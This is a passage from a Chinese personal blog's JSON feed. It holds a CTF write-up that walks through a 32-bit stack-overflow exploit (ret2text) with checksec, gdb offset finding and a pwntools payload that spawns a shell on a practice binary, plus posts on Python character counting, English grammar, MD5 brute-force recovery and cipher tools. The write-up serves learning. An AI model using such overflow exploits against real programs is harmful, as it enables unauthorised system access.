{
    "version": "https://jsonfeed.org/version/1",
    "title": "Galaxy Knight",
    "subtitle": "破站本站",
    "icon": "http://kyrita.top/images/favicon.ico",
    "description": "再不放假就要坏掉了",
    "home_page_url": "http://kyrita.top",
    "items": [
        {
            "id": "http://kyrita.top/ret2text/",
            "url": "http://kyrita.top/ret2text/",
            "title": "ret2text",
            "date_published": "2021-07-17T01:09:23.082Z",
            "content_html": "<p><a id=\"more\"></a></p>\n<h2 id=\"检查保护机制\"><a class=\"anchor\" href=\"#检查保护机制\">#</a> 检查保护机制</h2>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>checksec ret2text</pre></td></tr></table></figure><figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Arch:    i386-32-little //文件为32位程序</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>RELRO:    Partial RELRO</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Stack:    No canary found    //未开启canary保护</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>NX:      NX enabled    //开启了栈不可执行保护</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>PIE:      No PIE (0x8048000)    //未开启地址无关可执行</pre></td></tr></table></figure><p><img data-src=\"pic/ret2text/22508867-848911d41f68e4a3.png\" alt=\"\" /></p>\n<h3 id=\"canary栈保护\"><a class=\"anchor\" href=\"#canary栈保护\">#</a> canary（栈保护)</h3>\n<p>当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变);<br />\n 如果不合法就停止程序运行 (栈溢出发生)。<br />\n攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。在 Linux 中我们将 cookie 信息称为 Canary。</p>\n<h3 id=\"pie\"><a class=\"anchor\" href=\"#pie\">#</a> PIE</h3>\n<p>如果程序开启了 PIE 保护的话，在每次加载程序时都变换加载地址</p>\n<h3 id=\"nxdep\"><a class=\"anchor\" href=\"#nxdep\">#</a> NX(DEP)</h3>\n<p>NX 即 No-eXecute（不可执行）的意思，限制一块内存区域不可执行。</p>\n<h3 id=\"aslr\"><a class=\"anchor\" href=\"#aslr\">#</a> ASLR</h3>\n<p>ASLR（地址随机化）是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。</p>\n<h2 id=\"0x2\"><a class=\"anchor\" href=\"#0x2\">#</a> 0x2</h2>\n<p>本题是 32 位程序，对应的是 32 的 IDA。加载出来的是汇编语言，然后就要去看它的 main 函数按 F5 反汇编</p>\n<p><img data-src=\"pic/ret2text/22508867-2c22be6edd039812.png\" alt=\"\" title=\"这里存在栈溢出漏洞\" /></p>\n<h3 id=\"栈溢出漏洞\"><a class=\"anchor\" href=\"#栈溢出漏洞\">#</a> 栈溢出漏洞</h3>\n<p>简单讲，栈溢出就是向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，造成溢出。</p>\n<p><mark>发生栈溢出的条件</mark> 程序必须向栈上写入数据。写入的数据大小没有被良好地控制</p>\n<p><mark>利用方式</mark> 覆盖程序的返回地址为攻击者所控制的地址，比如该地址为执行 shellcode 的地址 shellcode 是一段用于利用软件漏洞而执行的代码，shellcode 为 16 进制的机器码，可以让攻击者获得 shell，利用 pwntools 可自动生成，等用到再说。可能造成栈溢出的函数。</p>\n<p><mark>可能造成栈溢出的函数有</mark> gets,scanf,vscanf,sprintf,strcpy,strcat，bcopy</p>\n<h2 id=\"0x3\"><a class=\"anchor\" href=\"#0x3\">#</a> 0x3</h2>\n<p>继续浏览其他函数的伪代码。发现 secure 函数中调用了 system（“/bin/sh”）<br />\n我们只需要想办法执行这 system（“/bin/sh”）从而拿到我们想要的 shell。</p>\n<p><img data-src=\"pic/ret2text/22508867-4978445eded254f2.png\" alt=\"\" /></p>\n<p>我们现在大概确定了栈溢出漏洞，我们首先要知道这个漏洞到底有多深，然后我们了解了这个漏洞的深度把东西填装进去让他覆盖到这个 system（“/bin/sh”）这个地址我们就可以得到 shell 了。</p>\n<p>那如何确定这个偏移量和这个地址呢？</p>\n<h3 id=\"step1\"><a class=\"anchor\" href=\"#step1\">#</a> step1</h3>\n<p>利用 gdb 进行调试看它的偏移</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gdb -q ./ret2text         </pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>//gdb载入该文件</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>pattern create 200     </pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>//制造200个填充字符（多少字符都行），先把他复制下来</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>r                                 </pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>//运行程序</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>pattern offset 地址     </pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>//确定偏移</pre></td></tr></table></figure><p><img data-src=\"pic/ret2text/22508867-ef5ed1b8bd807dd4.png\" alt=\"\" /></p>\n<p><img data-src=\"pic/ret2text/22508867-fdfe76ec3c0ba50d.PNG\" alt=\"\" /></p>\n<p>计算的偏移量为 112，下面找到 system（“/bin/sh”）地址就可以构造 exp 了，<br />\n那么我们看 IDA 在 secure 中调用 system (“/bin/sh”) 的地址</p>\n<p><img data-src=\"pic/ret2text/22508867-0252408325f50505.png\" alt=\"\" /></p>\n<p><mark>exp 如下</mark></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span><span class=\"token operator\">*</span>                                 </pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">//</span>导入python库</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./ret2text\"</span><span class=\"token punctuation\">)</span>                     </pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">//</span>与文件建立本地连接，远程连接用r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'ip'</span><span class=\"token punctuation\">,</span>端口<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">112</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x804863A</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre> <span class=\"token operator\">//</span>p32<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>将其打包，<span class=\"token number\">64</span>位用p64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>                           </pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token operator\">//</span>发送payload</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>                                     </pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token operator\">//</span>直接进行交互，相当于回到shell的模式，在取得shell之后使用</pre></td></tr></table></figure><h3 id=\"执行exp\"><a class=\"anchor\" href=\"#执行exp\">#</a> 执行 exp</h3>\n<p><img data-src=\"pic/ret2text/22508867-d06a7cdcfdeb9781.png\" alt=\"\" /></p>\n",
            "tags": [
                "wiki",
                "pwn",
                "ret2text"
            ]
        },
        {
            "id": "http://kyrita.top/Python%E5%AE%9E%E7%8E%B0%E5%AD%97%E9%A2%91%E7%BB%9F%E8%AE%A1/",
            "url": "http://kyrita.top/Python%E5%AE%9E%E7%8E%B0%E5%AD%97%E9%A2%91%E7%BB%9F%E8%AE%A1/",
            "title": "Python实现字频统计",
            "date_published": "2021-07-10T06:45:42.826Z",
            "content_html": "<p>做题时遇到大量字符串怎么办？？<br />\n<a id=\"more\"></a></p>\n<p>利用 collection 模块简化代码</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> collections <span class=\"token keyword\">import</span> Counter</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"flag.txt\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\ttext_list <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>readlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token triple-quoted-string string\">'''将读取的内容转换为字符串'''</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\ttext_str <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>text_list<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tcount <span class=\"token operator\">=</span> Counter<span class=\"token punctuation\">(</span>text_str<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span>count<span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "wiki",
                "python",
                "python"
            ]
        },
        {
            "id": "http://kyrita.top/English-grammar/",
            "url": "http://kyrita.top/English-grammar/",
            "title": "English grammar",
            "date_published": "2021-03-09T01:30:04.236Z",
            "content_html": "<p>本篇均从高中英语语法中归纳总结出来的<br />\n<a id=\"more\"></a></p>\n<h1 id=\"句子成分\"><a class=\"anchor\" href=\"#句子成分\">#</a> 句子成分</h1>\n<h2 id=\"表语\"><a class=\"anchor\" href=\"#表语\">#</a> 表语:</h2>\n<p>He looks <span class=\"orange\">tired</span>. 形容词在系动词后作表语</p>\n<p>My job is <span class=\"orange\">cleaning</span> the manager's office. 动名词 (反复性) 在系动词后作表语</p>\n<p>My dream is <span class=\"orange\">to become a doctor</span> 不定式在系动词后作表语</p>\n<p>Lucy is <span class=\"orange\">in the classroom</span> 介宾短语在系动词后作表语</p>\n<h2 id=\"定语\"><a class=\"anchor\" href=\"#定语\">#</a> 定语:</h2>\n<p>This is an <span class=\"aqua\">interesting</span> story. 形容词修饰名词作前置定语</p>\n<p>I have something <span class=\"aqua\">interesting</span> to tell u. 形容词修饰不定代词作后置定语</p>\n<p>The girl <span class=\"aqua\">in the classroom</span> is my friend. 介宾短语修饰名词作后置定语</p>\n<p>The man <span class=\"aqua\">talking with my father</span> is my teacher. 现在分词 (主动 / 正在发生) 作后置定语</p>\n<p>The book <span class=\"aqua\">written by u</span> is interesting. 过去分词 (被动 / 已发生) 作后置定语</p>\n<p>The bike <span class=\"aqua\">being repaired</span> is mine. 过去分词进行时 (被动 / 正在发生) 作后置定语</p>\n<p>The days <span class=\"aqua\">to come</span> are sunny. 动词不定式的主动式 (主动 / 将来发生) 作后置定语</p>\n<p>The building <span class=\"aqua\">to be built</span> is our library. 动词不定式的被动式 (被动 / 准备发生) 作后置定语</p>\n<p>The <span class=\"aqua\">washing</span> machine is new. 动名词 (表用途) 作前置定语</p>\n<p>The <span class=\"aqua\">two</span> boys are students. 数词作前置定语</p>\n<p>Jack won the <span class=\"aqua\">golden</span> medal. 名词修饰名词作前置定语</p>\n<h2 id=\"状语\"><a class=\"anchor\" href=\"#状语\">#</a> 状语:</h2>\n<p>The question is <span class=\"red\">too</span> difficult. 状语副词修饰形容词作状语</p>\n<p>He runs <span class=\"red\">fast</span>. 副词修饰动词作状语</p>\n<p>He runs very <span class=\"red\">fast</span> 副词修饰副词作状语</p>\n<p><span class=\"red\">Luckily</span>,he passed the exam. 副词修饰句子作状语</p>\n<p>He goes to school <span class=\"red\">on foot</span> 介宾短语修饰动词作状语</p>\n<h1 id=\"复合句\"><a class=\"anchor\" href=\"#复合句\">#</a> 复合句</h1>\n<h2 id=\"名词性从句\"><a class=\"anchor\" href=\"#名词性从句\">#</a> 名词性从句</h2>\n<p>![](pic/english grammer/RhYbSDH3i6pFjJx.jpg)</p>\n<p>引导名词性从句的连接代词：what,which,whatever,whichever,who,whoever,whose,whom,whomever</p>\n<p>![](pic/english grammer/dae129441aa6becb.jpg)</p>\n<p>引导名词性从句的连接副词：when,where,wht,how</p>\n<p>![](pic/english grammer/vxuGATYze34FIQ1.jpg)</p>\n<p>![](pic/english grammer/AlS2VdwE1zbFWQ9.jpg)<br />\n 引导名词性从句的从属连词：that (无意义，不做成份),if (&quot;是否&quot;，不做成份)，whether (广泛)</p>\n<p>![](pic/english grammer/2VMXZiyxhbtu8Nl.jpg)</p>\n<p>总结：名词性从句在句中可作四大从句 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo fence=\"true\">{</mo><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right\" columnspacing=\"\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mtext>主语从句</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mtext>宾语从句</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mtext>表语从句</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mtext>同位语从句</mtext></mstyle></mtd></mtr></mtable></mrow><annotation encoding=\"application/x-tex\">\\left\\{\\begin{aligned}主语从句\\\\宾语从句\\\\表语从句\\\\ 同位语从句\\end{aligned}\\right.</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:6.00004em;vertical-align:-2.75002em;\"></span><span class=\"minner\"><span class=\"mopen\"><span class=\"delimsizing mult\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.2500200000000006em;\"><span style=\"top:-1.2999899999999998em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎩</span></span></span><span style=\"top:-1.2949899999999999em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎪</span></span></span><span style=\"top:-1.58999em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎪</span></span></span><span style=\"top:-1.8849900000000002em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎪</span></span></span><span style=\"top:-2.17999em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎪</span></span></span><span style=\"top:-2.2049900000000004em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎪</span></span></span><span style=\"top:-3.1500100000000004em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎨</span></span></span><span style=\"top:-4.29501em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎪</span></span></span><span style=\"top:-4.59001em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎪</span></span></span><span style=\"top:-4.885010000000001em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎪</span></span></span><span style=\"top:-5.180010000000001em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎪</span></span></span><span style=\"top:-5.205010000000001em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎪</span></span></span><span style=\"top:-5.50002em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎧</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.75002em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.25em;\"><span style=\"top:-5.41em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord cjk_fallback\">主</span><span class=\"mord cjk_fallback\">语</span><span class=\"mord cjk_fallback\">从</span><span class=\"mord cjk_fallback\">句</span></span></span><span style=\"top:-3.91em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord cjk_fallback\">宾</span><span class=\"mord cjk_fallback\">语</span><span class=\"mord cjk_fallback\">从</span><span class=\"mord cjk_fallback\">句</span></span></span><span style=\"top:-2.4099999999999993em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord cjk_fallback\">表</span><span class=\"mord cjk_fallback\">语</span><span class=\"mord cjk_fallback\">从</span><span class=\"mord cjk_fallback\">句</span></span></span><span style=\"top:-0.9099999999999997em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord cjk_fallback\">同</span><span class=\"mord cjk_fallback\">位</span><span class=\"mord cjk_fallback\">语</span><span class=\"mord cjk_fallback\">从</span><span class=\"mord cjk_fallback\">句</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.7500000000000004em;\"><span></span></span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span></p>\n<p>![](pic/english grammer/1GBWZMux2pHCvfz.jpg)</p>\n<p>![](pic/english grammer/vFY3HieylbLOIJ5.jpg)</p>\n<h3 id=\"that不可省的情况\"><a class=\"anchor\" href=\"#that不可省的情况\">#</a> that 不可省的情况</h3>\n<ol>\n<li>\n<p>He said <s>that</s> he was late again <span class=\"blue\">and</span> <span class=\"pink\">that</span> the teacher would punish him.</p>\n</li>\n<li>\n<p>I don't know <mark>that</mark> you called me yesterday <span class=\"blue\">and</span> why you called me.</p>\n</li>\n</ol>\n<h3 id=\"用whether不用if的情况\"><a class=\"anchor\" href=\"#用whether不用if的情况\">#</a> 用 whether 不用 if 的情况</h3>\n<p>I. 表主同</p>\n<p><mark>Whether we can do it</mark> is a problem. &lt;主从&gt;</p>\n<p>The problem is <mark>Whether we can do it</mark>  &lt;表从&gt;</p>\n<p>The problem <mark>Whether we can do it</mark> has benn solved. &lt;同位语从句&gt;</p>\n<p>II.+ or not 或 不定式</p>\n<p>III.whether 引导名从、宾语从句</p>\n<p>We are discussing <mark>whether marry could join us</mark></p>\n<p>IV. 介词后用 whether</p>\n<p>This depends <span class=\"red\">on</span> whether you can do the job.</p>\n",
            "tags": [
                "英语",
                "语法",
                "英语语法"
            ]
        },
        {
            "id": "http://kyrita.top/%E4%BF%AE%E5%A4%8D%E7%A0%B4%E7%A2%8E%E7%9A%84MD5/",
            "url": "http://kyrita.top/%E4%BF%AE%E5%A4%8D%E7%A0%B4%E7%A2%8E%E7%9A%84MD5/",
            "title": "修复破碎的MD5",
            "date_published": "2021-03-03T02:01:13.070Z",
            "content_html": "<p>我们得到了一串神秘字符串：TASC?O3RJMV?WDJKX?ZM, 问号部分是未知大写字母，为了确定这个神秘字符串，我们通过了其他途径获得了这个字串的 32 位 MD5 码。但是我们获得它的 32 位 MD5 码也是残缺不全，E903???4DAB????08?????51?80??8A?<br />\n<a id=\"more\"></a><br />\n 已知字符串缺少三个大写字母，我们只需爆破字符串即可恢复 MD5</p>\n<h1 id=\"python脚本\"><a class=\"anchor\" href=\"#python脚本\">#</a> Python 脚本</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> hashlib   </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>src1<span class=\"token operator\">=</span><span class=\"token string\">\"TASC\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>src2<span class=\"token operator\">=</span><span class=\"token string\">\"O3RJMV\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>src3<span class=\"token operator\">=</span><span class=\"token string\">\"WDJKX\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>src4<span class=\"token operator\">=</span><span class=\"token string\">\"ZM\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>dic <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'A'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'B'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'C'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'D'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'E'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'F'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'G'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'H'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'I'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'J'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'K'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'L'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'M'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'N'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'O'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'P'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Q'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'R'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'S'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'T'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'U'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'V'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'W'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'X'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Y'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Z'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">26</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">26</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">26</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            src<span class=\"token operator\">=</span>src1<span class=\"token operator\">+</span>dic<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>src2<span class=\"token operator\">+</span>dic<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>src3<span class=\"token operator\">+</span>dic<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>src4 <span class=\"token comment\">#恢复字符串</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            s1<span class=\"token operator\">=</span>hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span>src<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>upper<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token comment\"># hash.hexdigest() </span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token comment\"># 返回摘要，作为十六进制数据字符串值</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">if</span> s1<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token string\">'E903'</span><span class=\"token punctuation\">:</span> <span class=\"token comment\">#筛选</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>              <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s1<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>最后得到完整的 MD5</p>\n<p>E9032994DABAC08080091151380478A2</p>\n",
            "tags": [
                "wiki",
                "密码学",
                "MD5修复"
            ]
        },
        {
            "id": "http://kyrita.top/%E4%BB%8A%E6%97%A5%E4%BB%BD%E7%9A%84%E5%AF%86%E7%A0%81%E5%AD%A6/",
            "url": "http://kyrita.top/%E4%BB%8A%E6%97%A5%E4%BB%BD%E7%9A%84%E5%AF%86%E7%A0%81%E5%AD%A6/",
            "title": "今日份的密码学",
            "date_published": "2021-02-27T12:04:05.163Z",
            "content_html": "<p>在这里记录一个很好用的爆破密码网站<br />\n<a id=\"more\"></a><br />\n 今天在做一道密码题时发现无论怎样，这个密码都解不开来。<br />\n<img data-src=\"https://i.loli.net/2021/02/27/8Q1sfJvUe2MIp79.png\" alt=\"\" title=\"完全没见过的加密排列\" /><br />\n于是就和今天这个<span class=\"exturl\" data-url=\"aHR0cHM6Ly9xdWlwcWl1cC5jb20v\">网站</span>邂逅了</p>\n<p>直接把密文放入 solve 就可以了，下面会把爆破出来的结果一一列出。<br />\n<img data-src=\"https://i.loli.net/2021/02/27/IPHKnTNwhZpe94O.png\" alt=\"\" /></p>\n<p>以及凯撒密码都可以使用此类词频分析，自动化爆破。<br />\n<img data-src=\"https://i.loli.net/2021/02/27/XUMyQtSiwxj1AE2.png\" alt=\"\" /></p>\n<h2 id=\"脚本工贼都不写\"><a class=\"anchor\" href=\"#脚本工贼都不写\">#</a> 脚本？工贼都不写</h2>\n<p>Brainfuck and Ook!  ---&gt;   <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc3BsaXRicmFpbi5vcmcvc2VydmljZXMvb29r\">https://www.splitbrain.org/services/ook</span><br />\n 条形码 \\ 二维码        ---&gt;   <span class=\"exturl\" data-url=\"aHR0cHM6Ly9vbmxpbmUtYmFyY29kZS1yZWFkZXIuaW5saXRlcmVzZWFyY2guY29tLw==\">https://online-barcode-reader.inliteresearch.com/</span><br />\n 猪圈密码 \\ 维吉尼亚...  ---&gt;   <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5tZXRvb2xzLmluZm8vY29kZS9jOTAuaHRtbA==\">http://www.metools.info/code/c90.html</span><br />\nQuoted-Printable 编码 ---&gt;   <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5teGN6Lm5ldC90b29scy9RdW90ZWRQcmludGFibGUuYXNweA==\">http://www.mxcz.net/tools/QuotedPrintable.aspx</span><br />\n (一个等号和一个十六进制的数字)<br />\n Unicode 编码         ---&gt;   <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamI1MS5uZXQvdG9vbHMvb25saW5ldG9vbHMvamllbWkvdW5pZW5kZWNvZGUuaHRt\">https://www.jb51.net/tools/onlinetools/jiemi/uniendecode.htm</span><br />\n 其他工具             ---&gt;   <span class=\"exturl\" data-url=\"aHR0cDovL2VuY29kZS5jaGFodW8uY29tLw==\">http://encode.chahuo.com/</span></p>\n<h2 id=\"古典密码知多少\"><a class=\"anchor\" 